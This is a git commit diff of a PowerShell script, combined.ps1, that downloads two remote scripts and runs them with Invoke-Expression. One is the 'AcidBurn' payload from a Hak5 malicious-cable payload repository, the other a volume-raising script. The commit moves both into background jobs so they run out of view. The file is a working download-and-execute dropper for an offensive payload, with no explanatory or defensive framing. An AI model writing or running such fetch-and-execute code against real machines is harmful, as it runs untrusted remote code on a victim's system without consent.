c8f554d0b4ce0feb4aca8ccc93b0b67a42df4e56
Muhammad Hayyan <muhammadhayyan000@gmail.com>
2024-09-07 10:38:39 +0500

    combined.ps1

--- combined.ps1
+++ combined.ps1
@@ -1,9 +1,17 @@
-# Download and execute AcidBurn.ps1
+# Define the URL for AcidBurn.ps1 and volume_increase.ps1
 $urlAcidBurn = "https://raw.githubusercontent.com/I-Am-Jakoby/hak5-submissions/main/OMG/Payloads/OMG-AcidBurn/AcidBurn.ps1?dl=1"
-$scriptAcidBurn = Invoke-WebRequest -Uri $urlAcidBurn -UseBasicP -Method Get
-Invoke-Expression $scriptAcidBurn.Content
-
-# Download and execute volume_increase.ps1
 $urlVolumeIncrease = "https://raw.githubusercontent.com/Muhammad-Hayyan/vol_increase/main/vol.ps1?dl=1"
-$scriptVolumeIncrease = Invoke-WebRequest -Uri $urlVolumeIncrease -UseBasicP -Method Get
-Invoke-Expression $scriptVolumeIncrease.Content
+
+# Start the AcidBurn script in a background job
+Start-Job -ScriptBlock {
+    $scriptAcidBurn = Invoke-WebRequest -Uri $urlAcidBurn -Method Get
+    Invoke-Expression $scriptAcidBurn.Content
+}
+
+# Start the volume increase script in a background job
+Start-Job -ScriptBlock {
+    $scriptVolumeIncrease = Invoke-WebRequest -Uri $urlVolumeIncrease -Method Get
+    Invoke-Expression $scriptVolumeIncrease.Content
+}
+
+
